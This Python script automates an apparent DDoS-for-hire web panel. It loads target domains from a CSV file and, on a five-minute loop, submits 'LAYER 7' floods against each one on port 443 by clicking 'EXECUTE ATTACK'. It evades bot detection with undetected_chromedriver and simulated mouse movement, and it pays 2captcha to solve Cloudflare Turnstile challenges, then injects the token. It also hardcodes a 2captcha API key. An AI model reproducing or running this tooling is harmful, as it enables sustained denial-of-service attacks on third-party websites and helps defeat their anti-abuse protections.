import eel
import csv
import time
import threading
import os
import pickle
import random
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import undetected_chromedriver as uc

API_KEY = "6de2eb1629dd0ad5958fc45c68d492b4"
SITE_URL = "https://panel.nexarium.net/"
SITE_KEY = "0x4AAAAAAADnPIDROrmt1Wwj"

eel.init('web')
driver = uc.Chrome()
actions = ActionChains(driver)

# Load cookies if exist
if os.path.exists("cookies.pkl"):
    driver.get("https://panel.nexarium.net")
    with open("cookies.pkl", "rb") as f:
        cookies = pickle.load(f)
        for cookie in cookies:
            driver.add_cookie(cookie)
    driver.refresh()
else:
    driver.get("https://panel.nexarium.net")

def random_sleep(base):
    time.sleep(base + random.uniform(0.2, 1.0))

is_running = False

@eel.expose
def log(message):
    print(message)
    try:
        eel.display_log(message)
    except:
        pass

def wait_for_layer7(timeout=30):
    WebDriverWait(driver, timeout).until(
        EC.element_to_be_clickable((By.XPATH, '//button[.//text()[contains(., "LAYER 7")]]'))
    )
    time.sleep(3)

def solve_turnstile():
    log("[🔍] Solving Cloudflare Turnstile...")
    url = "http://2captcha.com/in.php"
    payload = {
        'key': API_KEY,
        'method': 'turnstile',
        'sitekey': SITE_KEY,
        'pageurl': SITE_URL,
        'json': 1
    }
    resp = requests.post(url, data=payload).json()
    if resp.get("status") != 1:
        log("[❌] 2Captcha request failed.")
        return None

    req_id = resp.get("request")
    fetch_url = f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={req_id}&json=1"

    for _ in range(30):
        time.sleep(5)
        res = requests.get(fetch_url).json()
        if res.get("status") == 1:
            log("[✅] Captcha solved.")
            return res.get("request")
        log("[...] Waiting for captcha result...")

    log("[❌] Timed out waiting for captcha solution.")
    return None

def inject_token(token):
    driver.execute_script("""
        document.querySelector('iframe[src*="challenges.cloudflare.com"]')
            .contentWindow.postMessage({
                eventId: "challenge-complete",
                payload: {
                    token: arguments[0],
                    e: Date.now()
                }
            }, "*");
    """, token)

def simulate_human_interaction():
    try:
        element = driver.find_element(By.TAG_NAME, "body")
        actions.move_to_element_with_offset(element, random.randint(0, 300), random.randint(0, 300)).perform()
        random_sleep(0.2)
        actions.click().perform()
        random_sleep(0.2)
    except:
        pass

@eel.expose
def load_domains():
    with open("data.csv", "r") as file:
        return [row[0] for row in csv.reader(file) if row]

@eel.expose
def save_domains(updated_list):
    try:
        with open("data.csv", "w", newline='') as file:
            writer = csv.writer(file)
            count = 0
            for domain in updated_list:
                clean = domain.strip()
                if clean:
                    writer.writerow([clean])
                    count += 1
        log(f"[💾] Saved {count} domain(s) to CSV.")
    except Exception as e:
        log(f"[!] Error saving domains: {e}")

def run_attack_cycle():
    global is_running
    is_running = True

    while is_running:
        domains = [d.strip() for d in load_domains() if d.strip()]
        if not domains:
            log("[!] No domains found. Retrying in 60 seconds...")
            time.sleep(60)
            continue

        try:
            wait_for_layer7()
        except:
            log("🟡 Could not detect LAYER 7 tab. Please ensure you're logged in.")
            time.sleep(10)
            continue

        log(f"[▶] Starting attack cycle on {len(domains)} domain(s)...\n")
        for domain in domains:
            if not is_running:
                break
            run_attack(domain)

        if not is_running:
            break

        log("[🔍] Checking panel log for 'API error: 403'...")
        try:
            random_sleep(10)
            log_divs = driver.find_elements(By.CSS_SELECTOR, 'div.terminal-output div')
            log_lines = [div.text.strip().lower() for div in log_divs if div.text.strip()]
            if any("api error: 403" in line for line in log_lines):
                log("[⚠️] Found 'API error: 403'. Refreshing page...")
                driver.get("https://panel.nexarium.net/")
                time.sleep(3)
                simulate_human_interaction()

                token = solve_turnstile()
                if token:
                    inject_token(token)
                    log("[✅] Token injected into Cloudflare iframe.")

                try:
                    WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, '//button[.//text()[contains(., "LAYER 7")]]'))
                    )
                    log("[✅] LAYER 7 found after refresh. Continuing...")
                except:
                    log("[⚠️] LAYER 7 not found after refresh. Sending TAB + SPACE keypress...")
                    body = driver.find_element(By.TAG_NAME, "body")
                    body.send_keys(Keys.TAB)
                    time.sleep(0.2)
                    body.send_keys(Keys.SPACE)
                    time.sleep(2)

                    try:
                        wait_for_layer7()
                        log("[✅] LAYER 7 appeared after keypress.")
                    except:
                        log("[❌] LAYER 7 still not detected after keypress.")
                else:
                    log("[✅] No 403 error detected. No refresh needed.")
        except Exception as e:
                log(f"[!] Failed to check logs for 403 error: {e}")


        log("[⏳] Cycle complete. Waiting 5 minutes before restarting...\n")
        eel.startCountdown(300)()
        for _ in range(300):
            if not is_running:
                return
            time.sleep(1)

    log("[🛑] Attack cycle stopped.")

@eel.expose
def start_cycle():
    global is_running
    if not is_running:
        log("[🟢] Starting background attack cycle...")
        thread = threading.Thread(target=run_attack_cycle)
        thread.daemon = True
        thread.start()
    else:
        log("[⚠️] Attack cycle is already running.")

@eel.expose
def stop_app():
    global is_running
    log("[🔴] Stop button pressed. Shutting down...")
    is_running = False
    try:
        # Save cookies on shutdown
        with open("cookies.pkl", "wb") as f:
            pickle.dump(driver.get_cookies(), f)
    except Exception as e:
        log(f"[!] Failed to save cookies: {e}")
    time.sleep(1)
    os._exit(0)

@eel.expose
def restart_cycle():
    global is_running
    log("[🔁] Restart button pressed. Restarting cycle...")
    is_running = False
    time.sleep(1)
    start_cycle()

def run_attack(domain):
    try:
        log(f"[+] Starting attack on: {domain}")
        wait_for_layer7()
        driver.find_element(By.XPATH, '//button[.//text()[contains(., "LAYER 7")]]').click()
        time.sleep(1)

        log("-> Typing URL...")
        target_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, '//input[@placeholder="Enter target URL"]'))
        )
        target_input.click()
        target_input.send_keys(Keys.CONTROL, 'a')
        target_input.send_keys(Keys.DELETE)
        target_input.send_keys(domain)
        time.sleep(0.5)
        target_input.send_keys(Keys.TAB)

        log("-> Typing port...")
        driver.switch_to.active_element.send_keys("443")
        time.sleep(0.5)
        driver.switch_to.active_element.send_keys(Keys.TAB)

        log("-> Typing duration...")
        driver.switch_to.active_element.send_keys("200")
        time.sleep(0.5)
        driver.switch_to.active_element.send_keys(Keys.TAB)

        log("-> Wait for method (manual select)...")
        time.sleep(5)

        log("-> Clicking 'EXECUTE ATTACK' button...")
        execute_button = WebDriverWait(driver, 15).until(
            EC.element_to_be_clickable((By.XPATH, '//button[.//span[text()="EXECUTE ATTACK"]]'))
        )
        execute_button.click()

        log("[✓] Attack submitted.\n")
        time.sleep(15)

        log("-> Waiting for LAYER 7 tab to reappear...")
        wait_for_layer7()
        time.sleep(5)
        log("-> Page ready, continuing...\n")

    except Exception as e:
        log(f"[!] Error on {domain}: {e}")

eel.start('index.html', size=(450, 600))